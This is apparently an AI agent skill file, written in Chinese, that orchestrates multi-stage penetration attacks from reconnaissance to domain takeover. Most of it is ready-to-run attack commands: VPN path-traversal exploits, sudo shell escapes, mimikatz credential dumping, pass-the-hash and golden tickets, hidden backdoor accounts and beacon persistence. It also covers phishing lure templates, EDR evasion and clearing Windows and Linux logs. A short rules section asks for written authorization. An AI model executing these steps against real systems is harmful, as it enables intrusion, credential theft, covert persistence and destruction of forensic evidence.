- skill_id: attack-chain
  domain: pentest
  description: 多阶段攻击路径规划与执行总指挥：需要「从 A 打到 B」的完整链路时，编排各阶段、协调子 skill、规划攻击顺序。
  body: "\uFEFF# Attack Chain Orchestration Skill\n\n> 多阶段攻击路径规划与执行的总指挥。当任务需要\"从 A 打到 B\"的完整链路时，本 Skill\
    \ 负责编排各阶段、协调子 Skill、规划攻击路径。\n> 不是\"红队专属\"——任何需要跨阶段组合的渗透场景都从这里开始。\n\n---\n\n## 何时路由到本 Skill\n\n以下场景**必须**先经过本\
    \ Skill 做全链路规划，再分发到具体子 Skill 执行：\n\n| 场景 | 为什么需要编排 |\n|------|--------------|\n| \"帮我做一次完整的渗透测试\"\
    \ | 需要规划从信息收集到报告的全流程 |\n| \"从外网打到域控\" | 跨越边界突破→提权→横向→AD 多个阶段 |\n| \"HW 攻防演练\" | 需要完整攻击链 + 隐蔽性 + 痕迹清理\
    \ |\n| \"评估这个目标的攻击面\" | 需要多维度信息收集 + 路径规划 |\n| \"我拿到了一个 webshell，下一步怎么办\" | 需要从当前据点规划后续路径 |\n| \"帮我规划攻击路径\"\
    \ | 明确需要路径编排 |\n| \"从这个漏洞能打到什么程度\" | 需要评估漏洞的链式利用价值 |\n| \"Bug Bounty 持续监控\" | 需要自动化多阶段流程 |\n| \"内网渗透全流程\"\
    \ | 横向移动 + 提权 + 域攻击组合 |\n| \"近源渗透方案\" | 物理接入 + 内网渗透组合 |\n| \"供应链攻击路径\" | 跨组织多跳攻击 |\n| \"钓鱼 + 后渗透\"\
    \ | 初始访问 + 后续利用组合 |\n\n**单阶段任务不需要经过本 Skill**：\n- 只做端口扫描 → 直接去 `pentest-tools/`\n- 只做 SQL 注入 → 直接去\
    \ `pentest-tools/`\n- 只做 APK 逆向 → 直接去 `apk-reverse/`\n- 只做域渗透 → 直接去 `pentest-tools/references/network-attack-defense.md`\n\
    \n---\n\n## 编排原则\n\n### 本 Skill 的角色\n\n```\n用户提出多阶段任务\n    ↓\nattack-chain/SKILL.md（本文件）\n    ↓ 规划攻击路径、确定阶段顺序\n\
    \    ↓ 评估每阶段所需工具和方法\n    ↓\n分发到具体子 Skill 执行：\n    ├── pentest-tools/     → 工具调用、漏洞利用\n    ├── apk-reverse/\
    \       → 移动端渗透\n    ├── js-reverse/        → Web 前端突破\n    ├── reverse-engineering/ → 二进制分析\n   \
    \ ├── ida-reverse/       → 深度逆向\n    └── browser-automation/ → 自动化操作\n    ↓\n每阶段完成后回到本 Skill 评估下一步\n\
    \    ↓\n全部完成 → docs-generator 生成报告\n```\n\n### 路径规划决策树\n\n```\n拿到目标后：\n1. 目标是什么？（Web/内网/云/移动/IoT）\n\
    2. 当前有什么？（外部视角/已有凭据/已有据点）\n3. 最终目标是什么？（域控/数据/特定系统/证明影响）\n4. 约束条件？（时间/隐蔽性/不可触碰的系统）\n    ↓\n根据以上信息规划最短路径\n\
    \    ↓\n一条路走不通 → 回到本 Skill 重新规划备选路径\n```\n\n---\n\n## 完整攻击链阶段\n\n---\n\n## 一、信息收集阶段（Reconnaissance）\n\
    \n### 1.1 企业数字资产测绘\n\n```bash\n# 子公司关联域名发现\nsubfinder -d target.com -o subdomains.txt\namass enum\
    \ -d target.com -passive -o amass_results.txt\n\n# 合并去重\ncat subdomains.txt amass_results.txt | sort\
    \ -u > all_subs.txt\n\n# 存活探测\nhttpx -l all_subs.txt -status-code -title -tech-detect -o alive.txt\n\
    \n# 端口扫描（全端口）\nnaabu -l all_subs.txt -top-ports 1000 -o ports.txt\nnmap -sV -sC -iL targets.txt -oA\
    \ nmap_results\n```\n\n**实战要点**：\n- 通过企查查/天眼查获取子公司列表，扩大攻击面\n- 关注测试环境（test.、dev.、staging.）和新上线系统\n\
    - 证书透明度日志（crt.sh）发现隐藏域名\n\n### 1.2 敏感信息泄露狩猎\n\n```bash\n# GitHub 搜索\n# org:Company filename:.env password\n\
    # org:Company filename:config.yml secret\n# org:Company \"jdbc:mysql\" password\n\n# Google Dork\n\
    # site:target.com filetype:sql\n# site:target.com inurl:admin\n# site:target.com ext:conf|cfg|ini\n\
    \n# JS 文件中的 API Key\ncat js_urls.txt | while read url; do\n  curl -s \"$url\" | grep -oP '(api[_-]?key|secret|token|password)\\\
    s*[:=]\\s*[\"\\047][^\"\\047]+'\ndone\n```\n\n**高价值目标**：\n- 云服务 AK/SK（阿里云、AWS、Azure）\n- 数据库连接字符串\n\
    - JWT 密钥\n- 内部 API 文档\n- VPN/堡垒机凭据\n\n### 1.3 员工信息画像\n\n**社工字典生成规则**：\n```\n{姓名拼音}{年份}       → zhangsan2024\n\
    {姓名首字母}{部门缩写}  → zs_dev\n{工号}@{域名}          → 10086@target.com\n{姓名}{常见后缀}       → zhangsan@123, zhangsan!@#\n\
    ```\n\n**信息来源**：\n- 脉脉/LinkedIn 部门架构\n- 企业公众号/官网团队介绍\n- 招聘信息（技术栈暴露）\n- 学术论文（邮箱暴露）\n\n### 1.4 技术栈指纹识别\n\
    \n```bash\n# Web 指纹\nwhatweb -i alive.txt --log-json=fingerprint.json\nhttpx -l alive.txt -tech-detect\
    \ -json -o tech.json\n\n# 特定框架探测\nnuclei -l alive.txt -tags tech -severity info -o tech_results.txt\n\
    \n# CMS 识别\nwpscan --url https://target.com --enumerate p,t,u\n```\n\n---\n\n## 二、边界突破阶段（Initial Access）\n\
    \n### 2.1 Web 漏洞利用（高频突破点）\n\n| 漏洞类型 | 检测工具 | 利用方式 |\n|---------|---------|---------|\n| SQL 注入 | sqlmap\
    \ | 数据提取 → 写 shell → OS 命令 |\n| SSTI | sstimap | 模板注入 → RCE |\n| 文件上传 | 手工 + Burp | Webshell → 反弹\
    \ shell |\n| 反序列化 | ysoserial/marshalsec | Java/PHP/Python RCE |\n| SSRF | 手工 | 内网探测 → 云元数据 → AK/SK\
    \ |\n| 未授权访问 | nuclei | Spring Actuator / Nacos / Redis |\n| XSS → Cookie | xsstrike | 管理员会话劫持 |\n\
    \n```bash\n# SQL 注入自动化\nsqlmap -u \"https://target.com/api?id=1\" --batch --dbs --random-agent\n\n\
    # SSTI 检测\nsstimap -u \"https://target.com/search?q=test\"\n\n# Nuclei 批量扫描\nnuclei -l alive.txt -severity\
    \ critical,high -tags cve,sqli,rce -o vulns.txt\n```\n\n### 2.2 供应链攻击\n\n**攻击路径**：\n1. 识别目标使用的第三方组件/服务商\n\
    2. 攻击供应商获取代码签名/更新推送权限\n3. 通过合法更新通道投递恶意载荷\n\n**常见入口**：\n- 开源组件投毒（npm/pip/maven）\n- SaaS 服务商 API 滥用\n\
    - 外包人员权限利用\n- 共享 IT 服务商横向渗透\n\n### 2.3 钓鱼攻击\n\n**邮件钓鱼**：\n```\n主题模板：\n- [紧急] VPN 证书即将过期，请立即更新\n- [IT通知]\
    \ 邮箱存储空间不足，请清理\n- [HR] 2024年度绩效考核结果查询\n- [财务] 报销系统升级，请重新登录确认\n```\n\n**载荷类型**：\n- Office 宏文档（.docm/.xlsm）\n\
    - LNK 快捷方式（伪装 PDF）\n- HTML 走私（HTML Smuggling）\n- ISO/IMG 镜像（绕过 MOTW）\n- OneNote 嵌入脚本\n\n**OAuth 钓鱼**（2025\
    \ 新趋势）：\n- 构造恶意 OAuth 应用请求权限\n- 用户授权后获取邮箱/文件访问权限\n- 无需密码，绕过 MFA\n\n### 2.4 近源渗透（Physical Access）\n\
    \n| 手法 | 工具 | 效果 |\n|------|------|------|\n| BadUSB | Rubber Ducky / WiFi Ducky | 键盘注入 → 反弹 shell\
    \ |\n| 恶意充电宝 | O.MG Cable | 伪装数据线植入后门 |\n| WiFi 钓鱼 | Fluxion / WiFi Pineapple | 伪造热点 → 凭据捕获 |\n| RFID\
    \ 克隆 | Proxmark3 | 门禁卡复制 → 物理进入 |\n| 网络植入 | Raspberry Pi / LAN Turtle | 内网持久接入点 |\n\n```bash\n# Fluxion\
    \ WiFi 钓鱼\nfluxion  # 交互式选择目标 AP → 创建伪造热点 → 捕获 WPA 密码\n\n# BadUSB 联动 Cobalt Strike\n# 通过 USB 注入 PowerShell\
    \ 下载器 → 上线 C2\n```\n\n### 2.5 VPN/远程接入突破\n\n```bash\n# Pulse Secure VPN（CVE-2019-11510）\ncurl -k \"\
    https://vpn.target.com/dana-na/../dana/html5acc/guacamole/../../../etc/passwd?/dana/html5acc/guacamole/\"\
    \n\n# Fortinet VPN（CVE-2018-13379）\ncurl -k \"https://vpn.target.com/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession\"\
    \n\n# 通用：密码喷洒\nhydra -L users.txt -P passwords.txt vpn.target.com https-form-post\n```\n\n### 2.6\
    \ 云服务突破\n\n```bash\n# AWS S3 桶枚举\naws s3 ls s3://target-bucket --no-sign-request\n\n# 云元数据 SSRF\n\
    curl http://169.254.169.254/latest/meta-data/iam/security-credentials/\n\n# Azure AD 密码喷洒\n# 使用 MSOLSpray\
    \ / Spray 工具\n```\n\n---\n\n## 三、权限提升阶段（Privilege Escalation）\n\n### 3.1 Windows 提权\n\n| 技术 | 条件 |\
    \ 工具 |\n|------|------|------|\n| Potato 系列 | SeImpersonate 权限 | SweetPotato / GodPotato / PrintSpoofer\
    \ |\n| 内核漏洞 | 未打补丁 | watson / wesng 检测 |\n| 服务路径劫持 | 不带引号的服务路径 | PowerUp |\n| DLL 劫持 | 可写 DLL 搜索路径\
    \ | Process Monitor |\n| AlwaysInstallElevated | 注册表配置 | msiexec 安装恶意 MSI |\n| 计划任务 | 可写任务脚本 | schtasks\
    \ 替换 |\n\n```powershell\n# 检测 SeImpersonate\nwhoami /priv | findstr \"SeImpersonate\"\n\n# Potato\
    \ 提权\n.\\GodPotato.exe -cmd \"cmd /c whoami\"\n\n# 自动化检测\n.\\winPEAS.exe\n```\n\n### 3.2 Linux 提权\n\
    \n```bash\n# SUID 检测\nfind / -perm -4000 -type f 2>/dev/null\n\n# sudo 滥用\nsudo -l\n# 常见可利用：vim, find,\
    \ python, nmap, less, awk, perl\n\n# sudo vim 提权\nsudo vim -c ':!/bin/bash'\n\n# sudo find 提权\nsudo\
    \ find / -exec /bin/bash \\;\n\n# 内核漏洞\nuname -r  # 检查版本\n# DirtyPipe (CVE-2022-0847), DirtyCow (CVE-2016-5195)\n\
    \n# 自动化检测\n./linpeas.sh\n```\n\n### 3.3 数据库提权\n\n```sql\n-- MSSQL xp_cmdshell\nEXEC sp_configure 'show\
    \ advanced options', 1; RECONFIGURE;\nEXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;\nEXEC xp_cmdshell\
    \ 'whoami';\n\n-- MySQL UDF 提权\nCREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';\n\
    SELECT sys_exec('id');\n\n-- PostgreSQL\nCOPY (SELECT '') TO PROGRAM 'id';\n```\n\n### 3.4 云权限提升\n\
    \n```bash\n# AWS IAM 枚举\naws iam list-attached-user-policies --user-name compromised-user\n# 寻找 iam:PassRole\
    \ + lambda:CreateFunction → 管理员权限\n\n# Azure AD\n# 全局管理员 → 所有订阅控制\n# 应用管理员 → 添加凭据到服务主体\n```\n\n---\n\
    \n## 四、横向移动阶段（Lateral Movement）\n\n### 4.1 凭据获取\n\n```bash\n# Mimikatz（Windows）\nmimikatz# sekurlsa::logonpasswords\n\
    mimikatz# lsadump::dcsync /domain:target.local /user:krbtgt\n\n# Linux 凭据\ncat /etc/shadow\ncat ~/.bash_history\
    \ | grep -i pass\nfind / -name \"*.conf\" -exec grep -l \"password\" {} \\;\n\n# NTLM Hash 提取\nsecretsdump.py\
    \ domain/user:password@dc_ip\n```\n\n### 4.2 Pass-the-Hash / Pass-the-Ticket\n\n```bash\n# PTH 横向\n\
    crackmapexec smb 10.0.0.0/24 -u administrator -H <NTLM_HASH> --exec-method smbexec\n\n# Kerberoasting\n\
    GetUserSPNs.py -request -dc-ip 10.0.0.1 domain/user:password\n\n# AS-REP Roasting\nGetNPUsers.py domain/\
    \ -usersfile users.txt -no-pass -dc-ip 10.0.0.1\n\n# 金票据\nmimikatz# kerberos::golden /user:Administrator\
    \ /domain:target.local /sid:S-1-5-21-... /krbtgt:<HASH> /ptt\n```\n\n### 4.3 隐蔽横向技术\n\n```bash\n#\
    \ WMI 无文件执行\nwmiexec.py domain/admin:password@target_ip \"whoami\"\n\n# DCOM 远程执行\ndcomexec.py domain/admin:password@target_ip\
    \ \"whoami\"\n\n# WinRM\nevil-winrm -i target_ip -u admin -H <NTLM_HASH>\n\n# PsExec（会留痕）\npsexec.py\
    \ domain/admin:password@target_ip\n\n# SSH 隧道（Linux 环境）\nssh -D 1080 user@pivot_host  # SOCKS 代理\n\
    ssh -L 3389:internal_host:3389 user@pivot_host  # 端口转发\n```\n\n### 4.4 NTLM Relay\n\n```bash\n# 关闭\
    \ Responder 的 SMB/HTTP\n# 编辑 Responder.conf: SMB = Off, HTTP = Off\n\n# 启动 Responder 捕获\nresponder\
    \ -I eth0\n\n# NTLM Relay 到目标\nntlmrelayx.py -tf targets.txt -smb2support\n\n# Coercer 强制认证\ncoercer\
    \ coerce -u user -p password -d domain -l attacker_ip -t dc_ip\n```\n\n### 4.5 AD 攻击路径\n\n```bash\n\
    # BloodHound 数据收集\nbloodhound-python -d domain.local -u user -p password -c All -ns dc_ip\n\n# 常见攻击路径：\n\
    # 1. 用户 → GenericAll → 目标用户 → 重置密码\n# 2. 用户 → WriteDacl → 目标 OU → 添加权限\n# 3. 计算机 → 约束委派 → 模拟任意用户\n\
    # 4. 用户 → DCSync 权限 → 导出所有 Hash\n\n# Certipy AD CS 攻击\ncertipy find -u user@domain -p password -dc-ip\
    \ dc_ip\ncertipy req -u user@domain -p password -ca CA-NAME -template VulnTemplate\n```\n\n---\n\n\
    ## 五、权限维持阶段（Persistence）\n\n### 5.1 Windows 持久化\n\n| 技术 | 隐蔽性 | 检测难度 |\n|------|:---:|:---:|\n| 计划任务\
    \ | 中 | 低 |\n| 注册表 Run 键 | 低 | 低 |\n| WMI 事件订阅 | 高 | 高 |\n| DLL 劫持 | 高 | 中 |\n| 影子账户 | 中 | 中 |\n|\
    \ Golden Ticket | 极高 | 极高 |\n| DSRM 后门 | 极高 | 极高 |\n\n```powershell\n# WMI 事件订阅（高隐蔽）\n$Filter = Set-WmiInstance\
    \ -Class __EventFilter -Arguments @{\n    Name = \"CoreFilter\"\n    EventNameSpace = \"root\\cimv2\"\
    \n    QueryLanguage = \"WQL\"\n    Query = \"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE\
    \ TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'\"\n}\n\n# 影子账户\nnet user support$ P@ssw0rd\
    \ /add /active:yes\nnet localgroup administrators support$ /add\n# 修改注册表 F 值克隆 RID\n```\n\n### 5.2\
    \ Linux 持久化\n\n```bash\n# SSH 密钥植入\necho \"ssh-rsa AAAA...\" >> /root/.ssh/authorized_keys\n\n# Crontab\
    \ 后门\n(crontab -l; echo \"*/5 * * * * /tmp/.hidden/beacon\") | crontab -\n\n# LD_PRELOAD 劫持\necho\
    \ \"/tmp/.hidden/evil.so\" > /etc/ld.so.preload\n\n# PAM 后门\n# 修改 pam_unix.so 添加万能密码\n\n# Systemd\
    \ 服务\ncat > /etc/systemd/system/update.service << 'EOF'\n[Unit]\nDescription=System Update Service\n\
    [Service]\nExecStart=/tmp/.hidden/beacon\nRestart=always\n[Install]\nWantedBy=multi-user.target\n\
    EOF\nsystemctl enable update.service\n```\n\n### 5.3 云环境持久化\n\n```bash\n# AWS Lambda 后门\n# 创建定时触发的\
    \ Lambda 函数，回连 C2\n\n# Azure AD 应用注册\n# 创建应用 → 添加密钥凭据 → 授予 Graph API 权限\n\n# 容器后门\n# 修改基础镜像 → 所有新容器自带后门\n\
    ```\n\n---\n\n## 六、EDR/AV 绕过（Evasion）\n\n### 6.1 核心绕过思路\n\n| 层面 | 技术 | 说明 |\n|------|------|------|\n\
    | 静态检测 | 加密/混淆/自定义加载器 | 避免签名匹配 |\n| 行为检测 | 间接系统调用/Unhooking | 绕过 API Hook |\n| 内存检测 | 模块踩踏/堆加密 | 避免内存扫描\
    \ |\n| 网络检测 | 域前置/合法服务隧道 | 混入正常流量 |\n| 日志检测 | ETW Patching/日志清除 | 减少痕迹 |\n\n### 6.2 实用绕过技术\n\n```\n\
    1. Shellcode 加载器自定义（不用公开工具）\n2. 系统调用直接调用（绕过 ntdll hook）\n3. 进程注入选择低监控进程（如 RuntimeBroker.exe）\n4. C2\
    \ 流量走 HTTPS + 域前置 / Cloudflare Workers\n5. 内存中执行，不落盘（Fileless）\n6. 利用合法签名程序加载（LOLBins）\n```\n\n###\
    \ 6.3 C2 框架选择\n\n| 框架 | 特点 | 适用场景 |\n|------|------|---------|\n| Cobalt Strike | 成熟稳定，团队协作 | 大型红队行动\
    \ |\n| Sliver | 开源，Go 编写 | 预算有限 |\n| Havoc | 现代化，模块化 | 需要定制 |\n| Mythic | 多 agent 支持 | 跨平台 |\n| AdaptixC2\
    \ | Kali 2026.1 收录 | 快速部署 |\n\n---\n\n## 七、痕迹清理（Anti-Forensics）\n\n```bash\n# Windows 日志清除\nwevtutil\
    \ cl Security\nwevtutil cl System\nwevtutil cl Application\n\n# Linux 日志清除\necho > /var/log/auth.log\n\
    echo > /var/log/syslog\nhistory -c && history -w\n\n# 时间戳修改\ntouch -t 202301010000 /path/to/file\n\
    \n# 内存清理\n# 确保 Mimikatz dump 已删除\n# 确保 C2 beacon 已退出\n# 确保临时文件已清除\n```\n\n---\n\n## 红队行动铁律\n\n###\
    \ 三条底线\n\n1. **所有操作必须获得书面授权**\n2. **数据渗出需进行匿名化处理**\n3. **清理所有攻击痕迹（包括内存驻留）**\n\n### 行动纪律\n\n- 每个操作前评估风险等级（低/中/高/严重）\n\
    - 高风险操作前通知项目经理\n- 保持操作日志（时间、动作、结果）\n- 发现高危漏洞立即上报，不扩大利用\n- 不影响业务可用性（禁止 DoS）\n- 不访问/下载真实用户数据\n\n###\
    \ 典型失败案例\n\n| 失败原因 | 后果 | 教训 |\n|---------|------|------|\n| 未清除 Mimikatz 内存 dump | 蓝队溯源完整攻击路径 | 操作后立即清理\
    \ |\n| C2 域名被威胁情报标记 | 首次连接即被拦截 | 使用新注册域名 + 域前置 |\n| 钓鱼邮件触发 DLP 告警 | 蓝队提前预警 | 测试邮件网关规则 |\n| 横向移动触发蜜罐\
    \ | 暴露攻击意图 | 先识别蜜罐再行动 |\n\n---\n\n## 工具速查表\n\n### 信息收集\n`subfinder` `amass` `httpx` `naabu` `katana`\
    \ `gau` `dnsx` `nmap` `whatweb` `wpscan`\n\n### 漏洞利用\n`nuclei` `sqlmap` `sstimap` `xsstrike` `burpsuite`\
    \ `metasploit`\n\n### 权限提升\n`winPEAS` `linpeas` `GodPotato` `PrintSpoofer` `watson`\n\n### 横向移动\n\
    `mimikatz` `crackmapexec/netexec` `impacket` `bloodhound` `certipy` `coercer` `responder` `evil-winrm`\n\
    \n### C2 框架\n`cobalt-strike` `sliver` `havoc` `mythic` `adaptixc2`\n\n### 近源渗透\n`fluxion` `aircrack-ng`\
    \ `proxmark3` `rubber-ducky` `wifi-pineapple`\n\n---\n\n## 与本包其他 Skill 的关系\n\n| 需求 | 路由到 |\n|------|--------|\n\
    | Web 漏洞深度利用 | `pentest-tools/SKILL.md` |\n| 内网 AD 攻击详细步骤 | `pentest-tools/references/network-attack-defense.md`\
    \ |\n| 逆向分析恶意样本 | `reverse-engineering/SKILL.md` |\n| APK 逆向（移动端渗透） | `apk-reverse/SKILL.md` |\n|\
    \ JS 前端签名绕过 | `js-reverse/SKILL.md` |\n| 自动化群体渗透 | Pentest Swarm AI（`pentestswarm scan --swarm`） |\n\
    | AI 辅助渗透 | `mcp-kali-server` / `metasploitmcp` / `hexstrike-ai` |\n| 报告生成 | `docs-generator/SKILL.md`\
    \ |\n| 攻击路径图 | `diagram-generator/SKILL.md` |"
